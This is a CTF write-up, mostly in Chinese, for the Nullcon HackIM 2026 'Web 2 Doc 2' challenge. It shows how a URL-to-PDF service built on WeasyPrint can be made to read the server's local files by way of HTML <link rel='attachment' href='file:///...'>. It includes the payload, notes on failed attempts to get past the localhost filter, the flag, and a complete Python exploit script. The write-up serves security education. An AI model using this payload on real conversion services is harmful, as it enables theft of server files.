---
title: "Web 2 Doc 2 - Nullcon Goa HackIM 2026 CTF"
category: "web"
subcategory: "lfi"
type: "writeup"
tags: ["file-read", "web", "pdf", "weasyprint", "lfi", "base64", "subprocess", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "\\- Local directory: web/Web2Doc2"
source:
  name: "CTFtime writeup #40545"
  url: "https://ctftime.org/writeup/40545"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "Web 2 Doc 2"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** Web 2 Doc 2
- **Author team:** 正规子群.AI
- **CTFtime tags:** file-read, web, pdf, weasyprint
- **CTFtime:** <https://ctftime.org/writeup/40545>

---
## 113 Web 2 Doc 2

\- Category: `web`  
\- Value: `335`  
\- Solves: `56`  
\- Solved by me: `True`  
\- Local directory: `web/Web2Doc2`

### 题目描述  
> This is the same service as Web2Doc v1, but this time we have removed the /admin/flag endpoint. Can you still gain access to the secret contents of /flag.txt?  
>  
> Hint: You should solve Web2Doc v1 first.  
>  
> Author: @gehaxelt

### 连接信息  
\- `52.59.124.14:5003`

### 附件下载地址  
\- 无

### 内存布局  
\- 暂无可解析二进制 或 本题主要是非二进制方向

### WP  
# Web2Doc2

\---  
## 题目信息  
\- 题目: Web 2 Doc 2  
\- 类型: Web  
\- 目标: 获取服务器上的 `/flag.txt`  
\- 远端: `52.59.124.14:5003`

\---  
## 解题思路总览  
题目提示说明该服务与 `Web2Doc v1` 相同，仅移除了 `/admin/flag`。这通常意味着核心漏洞仍在，只是原先的取旗路径被替换。

观察可得：  
1\. `/convert` 会接收用户给定 URL 并返回 PDF。  
2\. 生成器为 `WeasyPrint 68.1`（可由 `pdfinfo` 验证）。  
3\. 可以让服务加载我们可控的 HTML（例如 `<https://httpbin.org/base64/><base64_html>`）。

因此可构造“恶意 HTML -> 让 WeasyPrint 在转换时读取本地文件”的链路。

\---  
## 关键漏洞点  
WeasyPrint 支持 HTML 附件语义：

`<link rel="attachment" href="...">`

当渲染 PDF 时，`href` 指向的资源会被嵌入到 PDF 附件里。若 `href=file:///flag.txt`，则服务端本地文件会进入输出 PDF。

这等价于一个本地文件读取（LFI）到 PDF 附件通道。

\---  
## 具体利用步骤  
1\. 访问首页，提取验证码 `captcha`。  
2\. 构造 HTML：  
```html  
<html><head><link rel="attachment" href="file:///flag.txt" title="flag.txt"></head><body>web2doc2</body></html>  
```  
3\. 将该 HTML 做 Base64，拼成 URL：  
`<https://httpbin.org/base64/><encoded_payload>`  
4\. 提交到 `/convert`。  
5\. 得到 PDF 后，用 `pdfdetach -saveall` 提取附件。  
6\. 附件 `flag.txt` 即为目标文件内容。

\---  
## 失败尝试记录  
1\. 直接提交 `file:///flag.txt`  
\- 结果：服务端返回 `Failed to fetch URL`。  
\- 说明：入口 URL 存在协议/地址限制。

2\. 直接访问本地地址（`127.0.0.1`、`localhost`、十进制/十六进制变体）  
\- 结果：均被拦截。  
\- 说明：存在较严格的本地地址过滤。

3\. 通过页面内 `iframe`、`meta refresh`、`location` 跳转到本地资源  
\- 结果：在 WeasyPrint 场景下无有效回显。  
\- 说明：这条路径不是该题主解。

最终确认 `rel=attachment` 为稳定可用利用点。

\---  
## 复现命令  
```bash  
python3 solution/[solution.py](http://solution.py)  
```

\---  
## Flag  
```text  
ENO{weasy_pr1nt_can_h4v3_f1l3s_1n_PDF_att4chments!}  
```

### Exploit  
#### web/Web2Doc2/solution/[solution.py](http://solution.py)

```python  
#!/usr/bin/env python3  
import base64  
import os  
import re  
import subprocess  
import tempfile  
import urllib.parse

import requests

BASE = os.environ.get("TARGET", "http://52.59.124.14:5003")

def solve_once() -> str:  
s = requests.Session()  
r = s.get(f"{BASE}/", timeout=10)  
r.raise_for_status()

m = re.search(r'<div class="captcha-display">([A-Z0-9]{6})</div>', r.text)  
if not m:  
raise RuntimeError("captcha not found")  
captcha = m.group(1)

html_payload = (  
'<html><head>'  
'<link rel="attachment" href="file:///flag.txt" title="flag.txt">'  
'</head><body>web2doc2</body></html>'  
)  
b64 = base64.b64encode(html_payload.encode()).decode()  
controlled_url = "<https://httpbin.org/base64/>" + urllib.parse.quote(b64, safe="")

files = {  
"url": (None, controlled_url),  
"captcha_answer": (None, captcha),  
}  
pdf_resp = [s.post](http://s.post)(f"{BASE}/convert", files=files, timeout=20)  
pdf_resp.raise_for_status()  
if b"%PDF" not in pdf_resp.content[:16]:  
raise RuntimeError(f"unexpected response: {pdf_resp.text[:200]}")

with tempfile.TemporaryDirectory() as td:  
pdf_path = os.path.join(td, "out.pdf")  
with open(pdf_path, "wb") as f:  
f.write(pdf_resp.content)

subprocess.run(["pdfdetach", "-saveall", pdf_path, "-o", td], check=True, capture_output=True, text=True)

for name in os.listdir(td):  
path = os.path.join(td, name)  
if not os.path.isfile(path) or name == "out.pdf":  
continue  
data = open(path, "rb").read().decode(errors="ignore").strip()  
if re.search(r"(?:flag|ENO)\\{[^\n\r}]+\\}", data):  
return data

raise RuntimeError("flag-like content not found in extracted attachments")

def main() -> None:  
flag = solve_once()  
print(flag)

if __name__ == "__main__":  
main()  
```

\---
